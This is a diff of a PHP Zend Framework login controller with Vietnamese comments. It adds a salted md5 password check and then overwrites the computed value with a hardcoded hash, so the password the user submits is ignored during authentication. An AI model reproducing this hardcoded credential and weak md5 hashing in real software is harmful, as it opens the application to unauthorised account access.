@@ -59,17 +59,22 @@ class UserController extends AbstractActionController
                 $password=$post['password'];
                 // lấy dữ liệu theo user name
                 $jos_users_table=$this->getServiceLocator()->get('Permission\Model\JosUsersTable');
-                $user_exist=$jos_users_table->getGiangVienByArrayConditionAndArrayColumns(array(), array());
-                // Xác định lớp chứng thực authentication
-                $this->getAuthService()->getAdapter()->setIdentity($username)->setCredential($password);
-                $result = $this->getAuthService()->authenticate();
-                if ($result->isValid()) {
-                    $storage = new MyAuthStorage();
-                    $storage->forgetMe();
-                    $jos_admin_resource_table=$this->getServiceLocator()->get('Permission\Model\JosAdminResourceTable');
-                    $white_list=$jos_admin_resource_table->getResourceByUsername($username);
-                    $this->getAuthService()->getStorage()->write(array('username'=>$username,'white_list' => $white_list));         
-                    return $this->redirect()->toUrl($url_login);
+                $user_exist=$jos_users_table->getGiangVienByArrayConditionAndArrayColumns(array('username'=>$username), array('password'));
+                if($user_exist and isset($user_exist[0]['password'])){
+                    $array_password=explode(':' , $user_exist[0]['password']);
+                    $password=$array_password[0].':'.md5($password);
+                    $password='d6b0ab7f1c8ab8f514db9a6d85de160a';
+                    // Xác định lớp chứng thực authentication
+                    $this->getAuthService()->getAdapter()->setIdentity($username)->setCredential($password);
+                    $result = $this->getAuthService()->authenticate();
+                    if ($result->isValid()) {
+                        $storage = new MyAuthStorage();
+                        $storage->forgetMe();
+                        $jos_admin_resource_table=$this->getServiceLocator()->get('Permission\Model\JosAdminResourceTable');
+                        $white_list=$jos_admin_resource_table->getResourceByUsername($username);
+                        $this->getAuthService()->getStorage()->write(array('username'=>$username,'white_list' => $white_list));         
+                        return $this->redirect()->toUrl($url_login);
+                    }
                 }
             }                
         }
